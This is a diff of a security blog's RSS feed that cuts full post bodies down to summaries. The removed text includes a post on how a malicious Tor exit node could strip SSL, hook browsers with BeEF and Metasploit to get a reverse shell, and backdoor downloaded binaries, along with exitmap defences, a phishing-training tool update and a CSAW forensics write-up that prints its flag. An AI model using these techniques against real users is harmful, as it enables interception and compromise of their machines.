-&lt;/blockquote&gt;
-
-&lt;p&gt;The unfortunate part about this is that there is nothing (aside from using encrypted protocols&amp;hellip; more on this later) we can do about this. Sniffing is a completely passive operation, so the only protection is to be aware of the risks and avoid passing any sensitive data over Tor unencrypted.&lt;/p&gt;
-
-&lt;p&gt;But let&amp;rsquo;s say you&amp;rsquo;re an exit node operator trying to &lt;em&gt;break bad&lt;/em&gt;, not break slightly-inconvenient. Sniffing is for &lt;strong&gt;chumps&lt;/strong&gt;. Let&amp;rsquo;s turn it up a notch and start modifying some traffic.&lt;/p&gt;
-
-&lt;h3 id=&#34;turn-it-up-to-11&#34;&gt;Turn it up to 11&lt;/h3&gt;
-
-&lt;p&gt;Remember - as an exit node operator, we&amp;rsquo;re responsible for passing traffic to and from the client unmodified, right? &lt;a href=&#34;http://i.giphy.com/xT0BKNBeDmlxDkM51e.gif&#34;&gt;Yeah, right&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;Let&amp;rsquo;s take a look at just a few of the ways we can modify traffic:&lt;/p&gt;
-
-&lt;h4 id=&#34;ssl-mitm-sslstrip&#34;&gt;SSL MiTM &amp;amp; sslstrip&lt;/h4&gt;
-
-&lt;p&gt;SSL rains on our parade if we&amp;rsquo;re trying to cause havoc for our users. Fortunately for us as attackers, many sites have issues that allow us to force the user through unencrypted connections. Examples include redirects from HTTP to HTTPS, including HTTP content on an HTTPS site, and more.&lt;/p&gt;
-
-&lt;p&gt;A nifty tool to take advantage of this is called &lt;a href=&#34;http://www.thoughtcrime.org/software/sslstrip/&#34;&gt;sslstrip&lt;/a&gt;. All we have to do is proxy the traffic leaving our exit node through sslstrip and it&amp;rsquo;s game over in many scenarios.&lt;/p&gt;
-
-&lt;p&gt;Of course, if we want to be less sneaky, we can just straight up terminate the SSL connections with a self-signed cert. Then we have insight into all the SSL traffic crossing our exit node. Piece of cake.&lt;/p&gt;
-
-&lt;h4 id=&#34;hooking-browsers-with-beef&#34;&gt;Hooking Browsers with BeEF&lt;/h4&gt;
-
-&lt;p&gt;Now that we have insight into more traffic than before, we can start doing some damage. One example of this would be to use the &lt;a href=&#34;http://beefproject.com/&#34;&gt;BeEF framework&lt;/a&gt; to automatically &amp;ldquo;hook&amp;rdquo; browsers so they are under our control. Then, we can leverage Metasploit&amp;rsquo;s &lt;a href=&#34;https://community.rapid7.com/community/metasploit/blog/2015/07/16/the-new-metasploit-browser-autopwn-strikes-faster-and-smarter--part-2&#34;&gt;&amp;ldquo;browser autopwn&amp;rdquo;&lt;/a&gt; function to compromise the end host and drop a reverse shell. Game over.&lt;/p&gt;
-
-&lt;h4 id=&#34;backdoor-binaries&#34;&gt;Backdoor Binaries&lt;/h4&gt;
-
-&lt;p&gt;Let&amp;rsquo;s say that we see binaries being downloaded through our exit nodes. These can be full software downloads, or even updates to existing software that&amp;rsquo;s happening in the background that the user isn&amp;rsquo;t even aware of.&lt;/p&gt;
-
-&lt;p&gt;All we have to do to transparently backdoor binaries would be to proxy the Tor traffic through something like &lt;a href=&#34;https://github.com/secretsquirrel/the-backdoor-factory&#34;&gt;The Backdoor Factory&lt;/a&gt;. Then, as the software is executed, the end host is compromised. Game over.&lt;/p&gt;
-
-&lt;h3 id=&#34;catching-walter-white&#34;&gt;Catching Walter White&lt;/h3&gt;
-
-&lt;p&gt;While most Tor exit nodes (from what we can tell) play nice, it&amp;rsquo;s not terribly uncommon to find some that don&amp;rsquo;t. Remember all those theoretical attacks we just talked about? &lt;a href=&#34;http://www.cs.kau.se/philwint/spoiled_onions/&#34;&gt;They&lt;/a&gt; &lt;a href=&#34;http://packetstorm.foofus.com/papers/attack/jackin-tor.txt&#34;&gt;actually&lt;/a&gt; &lt;a href=&#34;http://www.leviathansecurity.com/blog/the-case-of-the-modified-binaries/&#34;&gt;happened&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;Fortunately, the Tor Project thought of this and &lt;a href=&#34;https://trac.torproject.org/projects/tor/wiki/doc/badRelays&#34;&gt;designed a safeguard&lt;/a&gt; to prevent bad exits from being used by clients. This comes in the form of a flag in &lt;a href=&#34;https://jordan-wright.com/blog/blog/2015/05/14/how-tor-works-part-three-the-consensus/&#34;&gt;the consensus&lt;/a&gt;. Not surprisingly, the flag is called &lt;code&gt;BadExit&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;To address the problem of hunting down bad exit nodes, a slick system called &lt;a href=&#34;https://github.com/NullHypothesis/exitmap&#34;&gt;exitmap&lt;/a&gt; was created.&lt;/p&gt;
-
-&lt;p&gt;Exitmap works like this:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;For each exit node:
-
-&lt;ul&gt;
-&lt;li&gt;Run Python module (file upload/download, login, etc.)&lt;/li&gt;
-&lt;li&gt;Record the results&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Exitmap leverages the awesome &lt;a href=&#34;https://stem.torproject.org/&#34;&gt;Stem&lt;/a&gt; library to do most of the heavy lifting for building circuits to each exit node. Pretty basic, but &lt;em&gt;effective&lt;/em&gt;.&lt;/p&gt;
-
-&lt;p&gt;Back in 2013, exitmap was created as part of the &lt;a href=&#34;http://www.cs.kau.se/philwint/spoiled_onions/&#34;&gt;Spoiled Onions project&lt;/a&gt;. The authors of the paper found 65 exit nodes that were tampering with traffic. This shows that, while the problem isn&amp;rsquo;t rampant (there were about 1000 exit nodes when they wrote the paper), it&amp;rsquo;s bad enough to warrant a sheriff to make sure exits are playing nice, which is why exitmap is still up, running, and actively maintained.&lt;/p&gt;
-
-&lt;p&gt;In &lt;a href=&#34;https://chloe.re/2015/06/20/a-month-with-badonions/&#34;&gt;another example&lt;/a&gt;, a researcher basically set up a fake login page and logged in through every exit node (similar to exitmap). Then, the HTTP logs were watched for any further login attempts. Multiple nodes tried to break in to the site using the same credentials the author used.&lt;/p&gt;
-
-&lt;h3 id=&#34;this-isn-t-just-tor-s-problem&#34;&gt;This Isn&amp;rsquo;t Just Tor&amp;rsquo;s Problem&lt;/h3&gt;
-
-&lt;p&gt;It&amp;rsquo;s important to note that this isn&amp;rsquo;t just Tor&amp;rsquo;s problem. There are a substantial number of hops along any given path, including the normal path between you, your ISP, and the cat picture you&amp;rsquo;re trying to look at. All it takes is one operator with malicious intent to cause serious harm.&lt;/p&gt;
-
-&lt;p&gt;The best thing you can do is to enforce encryption wherever possible. If the traffic can&amp;rsquo;t be seen, it can&amp;rsquo;t (feasibly) be modified.&lt;/p&gt;
-
-&lt;p&gt;Finally, keep in mind this is just an example of what happens when Tor operators act irresponsibly. This is &lt;strong&gt;not&lt;/strong&gt; the norm. In fact, a vast majority of exit node operators take their role very seriously and deserve a major &amp;ldquo;thank you&amp;rdquo; for all the risk they assume to keep information flowing freely.&lt;/p&gt;
-
-&lt;p&gt;&lt;sup id=&#34;end-1&#34;&gt;1&lt;/sup&gt; Actual image of evil Tor exit node operator. &lt;sup&gt;Not really.&lt;/sup&gt;&lt;/p&gt;
-</description>
+&lt;p&gt;This visibility puts quite a bit of trust in exit nodes and, for the most part, they tend to act responsibly. However, this isn&amp;rsquo;t always the case. This post will take a look at what happens when a Tor &lt;a href=&#34;https://i.imgur.com/L8L7k1Z.jpg&#34;&gt;exit node operator&lt;/a&gt; decides to &amp;ldquo;break bad&amp;rdquo; and wreak havoc on Tor users&lt;a href=&#34;#end-1&#34;&gt;&lt;sup&gt;1&lt;/sup&gt;&lt;/a&gt;.
+&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -429,176 +113,15 @@ with open(&amp;quot;thought_leaders.txt&amp;quot;, &amp;quot;r&amp;quot;) as use
       <pubDate>Wed, 30 Sep 2015 00:00:00 +0000</pubDate>
       
       <guid>https://jordan-wright.com/blog/2015/09/30/how-to-download-a-list-of-all-registered-domain-names/</guid>
-      <description>
-
-&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/download_domains.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/download_domains.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
 
 
 &lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
 
 &lt;p&gt;Every morning, the infosec field is greeted with an onslaught of freshly registered malicious domains. These domains are used to host phishing sites, maintain botnet command and control, harvest stolen information, and more.&lt;/p&gt;
 
-&lt;p&gt;Having the complete list of registered domains day-by-day offers substantial visibility that can be used for intel and repsonse. Fortunately, such lists not only exist, but are available (usually for free!) with little effort involved. This post will introduce TLD zone files, how to access them, and how they can be used to your benefit.&lt;/p&gt;
-
-&lt;h3 id=&#34;zone-files&#34;&gt;Zone Files&lt;/h3&gt;
-
-&lt;p&gt;Before being swamped with domains, let&amp;rsquo;s talk a little about how these lists of domains are organized. Someone has to keep track of all the domains for a certain TLD (.com, .net, .ninja, etc.). These are called the &lt;em&gt;registries&lt;/em&gt;. Each registry maintains a master list of all the domains they are responsible for. This master list is called a &amp;ldquo;&lt;a href=&#34;https://en.wikipedia.org/wiki/Zone_file&#34;&gt;zone file&lt;/a&gt;&amp;rdquo;.&lt;/p&gt;
-
-&lt;p&gt;It&amp;rsquo;s the registry&amp;rsquo;s responsibility to maintain this zone file. As you can imagine, the zone file for TLD&amp;rsquo;s updates many times a day as new domains are registered, other domains expire, and nameserver records are changed.&lt;/p&gt;
-
-&lt;h3 id=&#34;i-just-want-to-download-the-data&#34;&gt;I Just Want to Download the Data!&lt;/h3&gt;
-
-&lt;p&gt;So we know what zone files are for, but how do we access them? As mentioned before, each registry is responsible for maintaining the zone file for their TLD, but they are also responsible for maintaining &lt;em&gt;access to&lt;/em&gt; the zone file. This means that in some cases we&amp;rsquo;ll need to go directly to the registrar, but there are some helpful exceptions.&lt;/p&gt;
-
-&lt;h4 id=&#34;com-net-and-name&#34;&gt;.COM, .NET, and .NAME&lt;/h4&gt;
-
-&lt;p&gt;Let&amp;rsquo;s start with the most obvious ones: .com, .net, and .name (since it&amp;rsquo;s bundled). These are maintained by Verisign. &lt;a href=&#34;https://www.verisign.com/en_US/channel-resources/domain-registry-products/zone-file/index.xhtml&#34;&gt;Access to these zone files&lt;/a&gt; consists of downloading a &lt;a href=&#34;https://www.verisign.com/assets/VRSN_zonefile_access_request_form_201208.dotx&#34;&gt;Zone Access Form&lt;/a&gt; and emailing the completed form to &lt;code&gt;tldzone@verisign-grs.com&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;It took a couple of weeks for this access to be granted. After your form is approved, you will receive FTP credentials that can be used to download the zone files daily.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@tld:~# ftp rz.verisign-grs.com
-Connected to rz.verisign-grs.com.
-220-**** Welcome to the VeriSign Global Registry Services gTLD Zone FTP Server ****
-220-***
-220-*** This computer system is owned and operated by VeriSign, Inc.
-220-*** All software or information that you access or download from this
-220-*** server is being licensed to you under the terms of our Registrar
-220-*** License and Agreement.  Unauthorized access to this system may
-220-*** result in criminal prosecution.
-220-***
-220-*** All sessions established with this server are monitored and logged.
-220-*** Disconnect now if you do not consent to having your actions monitored
-220-*** and logged.
-220-***
-220-******!
-220
-Name: [redacted]
-331 Please specify the password.
-Password:
-230 Login successful.
-Remote system type is UNIX.
-Using binary mode to transfer files.
-ftp&amp;gt; ls
-200 PORT command successful. Consider using PASV.
-150 Here comes the directory listing.
-&amp;lt;snip&amp;gt;
--rw-r--r--    1 ftp      ftp      2497503218 Sep 29 15:20 com.zone.gz
--rw-r--r--    1 ftp      ftp      321976673 Sep 29 15:12 net.zone.gz
-226 Directory send OK.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;We&amp;rsquo;ll take a look at what we can do with these soon. First, let&amp;rsquo;s talk about how we can catch all that malware on &lt;code&gt;.ninja&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h4 id=&#34;the-centralized-zone-data-service-czds&#34;&gt;The Centralized Zone Data Service (CZDS)&lt;/h4&gt;
-
-&lt;p&gt;You&amp;rsquo;ve likely noticed that there are a &lt;em&gt;ton&lt;/em&gt; of new gTLDs appearing. At the time of this writing, there are &lt;a href=&#34;https://www.iana.org/domains/root/db&#34;&gt;1070 valid and sponsored TLDs&lt;/a&gt; approved by the IANA - a department of ICANN.&lt;/p&gt;
-
-&lt;p&gt;Since each registry maintains its own zone file, it&amp;rsquo;s overwhelming to try to get access to all of them separately. Fortunately, ICANN solved this problem by creating the Centralized Zone Data Service (CZDS).&lt;/p&gt;
-
-&lt;p&gt;CZDS &amp;ldquo;provides a centralized access point&amp;hellip; to the Zone Files provided by participating Top Level Domains&amp;rdquo;. This means that, by registering with CZDS, we can simultaneously request access to most of the TLD (including those gTLDs) zone files.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/download_domains/czds.png&#34;/&gt;&lt;/p&gt;
-
-&lt;p&gt;When you get access to a particular zone file, you&amp;rsquo;re able to download it via &lt;a href=&#34;https://czds.icann.org/en/help/api-access&#34;&gt;ICANN&amp;rsquo;s API&lt;/a&gt;. They even provide a &lt;a href=&#34;https://github.com/fourkitchens/czdap-tools&#34;&gt;Python client&lt;/a&gt; that can be used to bulk download all the zone files you have access to.&lt;/p&gt;
-
-&lt;p&gt;Unfortunately, you may not get access to all zone files. In fact, looking at &lt;a href=&#34;https://czdap.icann.org/en/reports&#34;&gt;the most recent report&lt;/a&gt; released by ICANN, TLDs such as &lt;code&gt;.aaa&lt;/code&gt; only have &lt;strong&gt;3&lt;/strong&gt; people authorized to use CZDS to download the zone file. We&amp;rsquo;ll work with what we have, I suppose.&lt;/p&gt;
-
-&lt;p&gt;Ok, we have enough data. Let&amp;rsquo;s start parsing.&lt;/p&gt;
-
-&lt;h3 id=&#34;parsing-zone-files&#34;&gt;Parsing Zone Files&lt;/h3&gt;
-
-&lt;p&gt;If you want to parse everything about the zone files, you can read about the full format in &lt;a href=&#34;https://tools.ietf.org/html/rfc1035&#34;&gt;RFC 1035&lt;/a&gt;, but this post is only interested in the domain -&amp;gt; nameserver mappings. So, let&amp;rsquo;s just start by taking a look at the contents of the file.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@tld:~# head com.zone -n 50
-; The use of the Data contained in Verisign Inc.&#39;s aggregated
-; .com, and .net top-level domain zone files (including the checksum
-; files) is subject to the restrictions described in the access Agreement
-; with Verisign Inc.
-
-$ORIGIN COM.
-$TTL 900
-@ IN    SOA     a.gtld-servers.net. nstld.verisign-grs.com. (
-                                  1443370544 ;serial
-                                  1800 ;refresh every 30 min
-                                  900 ;retry every 15 min
-                                  604800 ;expire after a week
-                                  86400 ;minimum of a day
-                                  )
-$TTL 172800
- NS A.GTLD-SERVERS.NET.
- NS G.GTLD-SERVERS.NET.
- NS H.GTLD-SERVERS.NET.
- NS C.GTLD-SERVERS.NET.
- NS I.GTLD-SERVERS.NET.
- NS B.GTLD-SERVERS.NET.
- NS D.GTLD-SERVERS.NET.
- NS L.GTLD-SERVERS.NET.
- NS F.GTLD-SERVERS.NET.
- NS J.GTLD-SERVERS.NET.
- NS K.GTLD-SERVERS.NET.
- NS E.GTLD-SERVERS.NET.
- NS M.GTLD-SERVERS.NET.
-COM. 86400 DNSKEY 257 3 8 AQPD&amp;lt;snip&amp;gt;
-COM. 86400 DNSKEY 256 3 8 AQOp&amp;lt;snip&amp;gt;
-COM. 86400 NSEC3PARAM 1 0 0 -
-COM. 900 RRSIG SOA 8 1 900 20151004161544 20150927150544 35864 COM. MpW&amp;lt;snip&amp;gt;
-COM. RRSIG NS 8 1 172800 20151003045209 20150926034209 35864 COM. mcxl&amp;lt;snip&amp;gt;
-COM. 86400 RRSIG NSEC3PARAM 8 1 86400 20151003045209 20150926034209 35864 COM. SLk71&amp;lt;snip&amp;gt;
-COM. 86400 RRSIG DNSKEY 8 1 86400 20150930182533 20150923182033 30909 COM. pDtt&amp;lt;snip&amp;gt;
-KITCHENEROKTOBERFEST NS NS1.HOSTINGNET
-KITCHENEROKTOBERFEST NS NS2.HOSTINGNET
-KITCHENFLOORTILE NS NS1.HOSTINGNET
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;The first 35 lines of the file include some information about the zone file, the root name servers, etc. The actual meat of the file starts on line 36.&lt;/p&gt;
-
-&lt;p&gt;Typically, zone files contain lines that have the following format:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;Name&lt;/li&gt;
-&lt;li&gt;TTL&lt;/li&gt;
-&lt;li&gt;Record Class&lt;/li&gt;
-&lt;li&gt;Record Type&lt;/li&gt;
-&lt;li&gt;Record Data&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;In our example, we see that &lt;code&gt;KITCHENROKTOBERFEST.COM&lt;/code&gt; (the .com is understood) points to the name servers at &lt;code&gt;NS1.HOSTINGNET.COM&lt;/code&gt; and &lt;code&gt;NS2.HOSTINGNET.COM&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;In addition to lines showing how domain names map to nameservers, at the bottom of the file we have the A records (IP addresses) for each name server in the file. But what if we want to remove all the &amp;ldquo;fluff&amp;rdquo; and only keep the lines showing which domains map to which nameservers?&lt;/p&gt;
-
-&lt;p&gt;We can grab the &amp;ldquo;interesting&amp;rdquo; lines using a simple &lt;code&gt;grep -E &amp;quot;^[a-zA-Z0-9-]+ NS .&amp;quot; com.zone&lt;/code&gt;, which will give us only the lines with domains pointing to nameservers.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@tld:~# grep -E &amp;quot;^[a-zA-Z0-9-]+ NS .&amp;quot; com.zone | head -n 10
-KITCHENEROKTOBERFEST NS NS1.HOSTINGNET
-KITCHENEROKTOBERFEST NS NS2.HOSTINGNET
-KITCHENFLOORTILE NS NS1.HOSTINGNET
-KITCHENFLOORTILE NS NS2.HOSTINGNET
-KITCHENTABLESET NS NS1.HOSTINGNET
-KITCHENTABLESET NS NS2.HOSTINGNET
-KITEPICTURES NS NS1.HOSTINGNET
-KITEPICTURES NS NS2.HOSTINGNET
-BOYSBOXERS NS NS1.HOSTINGNET
-BOYSBOXERS NS NS2.HOSTINGNET
-
-root@tld:~# grep -E &amp;quot;^[a-zA-Z0-9-]+ NS .&amp;quot; com.zone | wc -l
-281899907
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;strong&gt;Awesome.&lt;/strong&gt; We can parse this output to do anything we want with our list of domains.&lt;/p&gt;
-
-&lt;h3 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h3&gt;
-
-&lt;p&gt;There are a &lt;em&gt;ton&lt;/em&gt; of use cases for this data in terms of information security, such as typo-squat monitoring, DGA monitoring, bit flip monitoring, etc.
-However, while this is an infosec blog, zone files can be used for far more than that. It could be used to detect name trends, watch for certain keywords, and more.&lt;/p&gt;
-
-&lt;p&gt;Now, consider what would happen if you kept a version controlled &lt;em&gt;diff&lt;/em&gt; of this data every day. That would allow you to see trends over time or, for infosec, watch how domains change. Domain move behind Cloudflare/Akamai? You&amp;rsquo;ll have a record of what nameserver they pointed to before the move.&lt;/p&gt;
-
-&lt;p&gt;I hope this sheds some light on not only how useful zone files are, but also how &lt;strong&gt;accessible&lt;/strong&gt; they are. ICANN, Verisign, and other registries deserve credit for making this data available to the public.&lt;/p&gt;
-
-&lt;p&gt;As always, let me know if you have questions/comments.&lt;/p&gt;
-
-&lt;p&gt;-Jordan (&lt;a href=&#34;https://twitter.com/jw_sec&#34;&gt;@jw_sec&lt;/a&gt;)&lt;/p&gt;
-</description>
+&lt;p&gt;Having the complete list of registered domains day-by-day offers substantial visibility that can be used for intel and repsonse. Fortunately, such lists not only exist, but are available (usually for free!) with little effort involved. This post will introduce TLD zone files, how to access them, and how they can be used to your benefit.
+&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -607,47 +130,15 @@ However, while this is an infosec blog, zone files can be used for far more than
       <pubDate>Tue, 29 Sep 2015 06:45:33 +0000</pubDate>
       
       <guid>https://jordan-wright.com/blog/2015/09/29/gophish-update-importing-sites-and-emails/</guid>
-      <description>
-
-&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/gophish_purple.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/gophish_purple.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
 
 
 &lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
 
 &lt;p&gt;I&amp;rsquo;m excited to announce that the &lt;a href=&#34;https://github.com/jordan-wright/gophish&#34;&gt;gophish&lt;/a&gt; &amp;ldquo;alpha&amp;rdquo; release is almost complete! I&amp;rsquo;m just cleaning up a few bugs, touching some things up, etc. In the meantime, I wanted to write a quick post to show off some really slick features that I was able to add earlier than planned.&lt;/p&gt;
 
-&lt;p&gt;Creating pixel-perfect email templates and landing pages are crucial to delivering the best possible phishing training. Gophish has always had the ability to create these, but it was quite frankly a &lt;em&gt;pain&lt;/em&gt; to use as you needed the raw HTML or text for both the email and site content. In this post, let&amp;rsquo;s take a look at how we can now &lt;strong&gt;import sites and emails directly into gophish&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;h3 id=&#34;importing-sites&#34;&gt;Importing Sites&lt;/h3&gt;
-
-&lt;p&gt;Attackers often &lt;a href=&#34;https://jordan-wright.com/blog/blog/2014/07/30/how-to-hunt-down-phishing-kits/&#34;&gt;create phishing kits&lt;/a&gt; containing exact copies of web site content in an attempt to fool users into entering credentials. To have training that keeps up with this pace, we need the ability to mimic this behavior and clone a site effectively.&lt;/p&gt;
-
-&lt;p&gt;Let&amp;rsquo;s take a look at how easy it is to import a site using gophish:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/gophish_screenshots/import_site.gif&#34;/&gt;&lt;/p&gt;
-
-&lt;p&gt;This works by grabbing the HTML content of the site and adding a &lt;code&gt;&amp;lt;base&amp;gt;&lt;/code&gt; tag so that relative resources (like CSS, JS, etc.) are loaded from the site itself.&lt;/p&gt;
-
-&lt;p&gt;You could use this functionality to clone things such as your own webmail login, company webpage, or other services that the users may be prone to entering sensitive information into. Of course, once you import a site, you&amp;rsquo;re free to edit it to add template variables, change links, etc. through the gophish editor.&lt;/p&gt;
-
-&lt;h3 id=&#34;importing-email&#34;&gt;Importing Email&lt;/h3&gt;
-
-&lt;p&gt;The emails you use in your training are the bait to your phish. Having believable emails is the key to good training, since this will show users first-hand how legit phishing emails can look.&lt;/p&gt;
-
-&lt;p&gt;What better way to get some believable looking email templates than to use &lt;em&gt;real&lt;/em&gt; emails? Now you can import an email in gophish via a simple copy/paste from your email client.&lt;/p&gt;
-
-&lt;p&gt;Here&amp;rsquo;s an example showing how we can import an email from Gmail:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/gophish_screenshots/import_email.gif&#34;/&gt;&lt;/p&gt;
-
-&lt;p&gt;This functionality is provided by the Go &lt;a href=&#34;https://github.com/jordan-wright/email&#34;&gt;email&lt;/a&gt; library I initially created specifically for gophish. The import function takes care of most of the decoding for you, but if you have any issues please let me know by &lt;a href=&#34;https://github.com/jordan-wright/gophish/issues&#34;&gt;filing an issue!&lt;/a&gt;&lt;/p&gt;
-
-&lt;h3 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h3&gt;
-
-&lt;p&gt;I&amp;rsquo;m really excited to release gophish in the upcoming month or so and bring enterprise-grade phishing training to &lt;em&gt;anyone&lt;/em&gt; who wants it. Until then, keep checking out the pre-alpha and &lt;a href=&#34;https://github.com/jordan-wright/gophish/issues&#34;&gt;let me know&lt;/a&gt; if you have any questions or comments!&lt;/p&gt;
-
-&lt;p&gt;Jordan (&lt;a href=&#34;https://twitter.com/jw_sec&#34;&gt;@jw_sec&lt;/a&gt;)&lt;/p&gt;
-</description>
+&lt;p&gt;Creating pixel-perfect email templates and landing pages are crucial to delivering the best possible phishing training. Gophish has always had the ability to create these, but it was quite frankly a &lt;em&gt;pain&lt;/em&gt; to use as you needed the raw HTML or text for both the email and site content. In this post, let&amp;rsquo;s take a look at how we can now &lt;strong&gt;import sites and emails directly into gophish&lt;/strong&gt;.
+&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -659,52 +150,9 @@ However, while this is an infosec blog, zone files can be used for far more than
       <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/csaw_100.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
 
 
-&lt;p&gt;For this challenge, we were given an HDD image and asked to find the flag on it.&lt;/p&gt;
+&lt;p&gt;For this challenge, we were given an HDD image and asked to find the flag on it.
 
-&lt;p&gt;Let&amp;rsquo;s start by seeing what kind of file we&amp;rsquo;re dealing with:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;jordan@temp:~/csaw$ file flash_c8429a430278283c0e571baebca3d139.img
-flash_c8429a430278283c0e571baebca3d139.img: x86 boot sector, mkdosfs boot message display, code offset 0x3c, OEM-ID &amp;quot;mkfs.fat&amp;quot;, sectors/cluster 4, root entries 512, Media descriptor 0xf8, sectors/FAT 256, heads 64, sectors 262144 (volumes &amp;gt; 32 MB) , serial number 0xa0f1dff7, unlabeled, FAT (16 bit)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ok, a standard FAT volume. Let&amp;rsquo;s try to mount it:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;jordan@temp:~/csaw$ mount flash_c8429a430278283c0e571baebca3d139.img -t vfat -o loop,ro,noexec /mnt
-jordan@temp:~$ cd /mnt/
-jordan@temp:/mnt$ ls
-100.txt  29.txt  48.txt  67.txt  86.txt      pg1184.txt  pg2000.txt  pg4300.txt
-10.txt   2.txt   49.txt  68.txt  87.txt      pg11.txt    pg2147.txt  pg4363.txt
-11.txt   30.txt  4.txt   69.txt  88.txt      pg120.txt   pg2148.txt  pg46.txt
-12.txt   31.txt  50.txt  6.txt   89.txt      pg1232.txt  pg236.txt   pg5000.txt
-13.txt   32.txt  51.txt  70.txt  8.txt       pg1260.txt  pg23.txt    pg5200.txt
-14.txt   33.txt  52.txt  71.txt  90.txt      pg1322.txt  pg244.txt   pg526.txt
-15.txt   34.txt  53.txt  72.txt  91.txt      pg132.txt   pg2500.txt  pg55.txt
-16.txt   35.txt  54.txt  73.txt  92.txt      pg1342.txt  pg2542.txt  pg62.txt
-17.txt   36.txt  55.txt  74.txt  93.txt      pg135.txt   pg2554.txt  pg730.txt
-18.txt   37.txt  56.txt  75.txt  94.txt      pg1399.txt  pg2591.txt  pg74.txt
-19.txt   38.txt  57.txt  76.txt  95.txt      pg1400.txt  pg2600.txt  pg768.txt
-1.txt    39.txt  58.txt  77.txt  96.txt      pg1497.txt  pg2701.txt  pg76.txt
-20.txt   3.txt   59.txt  78.txt  97.txt      pg158.txt   pg2814.txt  pg844.txt
-21.txt   40.txt  5.txt   79.txt  98.txt      pg160.txt   pg2852.txt  pg84.txt
-22.txt   41.txt  60.txt  7.txt   99.txt      pg161.txt   pg3207.txt  pg863.txt
-23.txt   42.txt  61.txt  80.txt  9.txt       pg1656.txt  pg33.txt    pg972.txt
-24.txt   43.txt  62.txt  81.txt  pg100.txt   pg1661.txt  pg345.txt   pg98.txt
-25.txt   44.txt  63.txt  82.txt  pg1080.txt  pg16.txt    pg35.txt
-26.txt   45.txt  64.txt  83.txt  pg108.txt   pg174.txt   pg3600.txt
-27.txt   46.txt  65.txt  84.txt  pg10.txt    pg1952.txt  pg36.txt
-28.txt   47.txt  66.txt  85.txt  pg1155.txt  pg1998.txt  pg41.txt
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Looks like we have quite a few files to dig through. Looks like it&amp;rsquo;s going to take a while. Ooooorrr, we could just grep for the flag.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@malfirm:/mnt# grep -r &amp;quot;flag{&amp;quot; * .*
-./.10/.hidden:flag{b3l0w_th3_r4dar}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Sweet. The flag is &lt;code&gt;flag{b3l0w_th3_r4dar}&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Jordan (&lt;a href=&#34;https://twitter.com/jw_sec&#34;&gt;@jw_sec&lt;/a&gt;)&lt;/p&gt;
-</description>
+Let&amp;rsquo;s start by seeing what kind of file we&amp;rsquo;re dealing with:&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -721,158 +169,9 @@ jordan@temp:/mnt$ ls
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;I was sniffing some web traffic for a while, I think i finally got something interesting. Help me find flag through all these packets.
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;This challenge started off with a pcap. Let&amp;rsquo;s take the cheap way out and do a basic Wireshark filter for &lt;code&gt;frame contains flag&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;This challenge started off with a pcap. Let&amp;rsquo;s take the cheap way out and do a basic Wireshark filter for &lt;code&gt;frame contains flag&lt;/code&gt;:
 
-&lt;p&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/csaw2015/frame_contains.png&#34;&gt;&lt;/p&gt;
-
-&lt;p&gt;Awesome - looks like we found a packet. Following the TCP stream reveals a Python script (formatted - you&amp;rsquo;re welcome) and what appears to be the output of the script:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import string
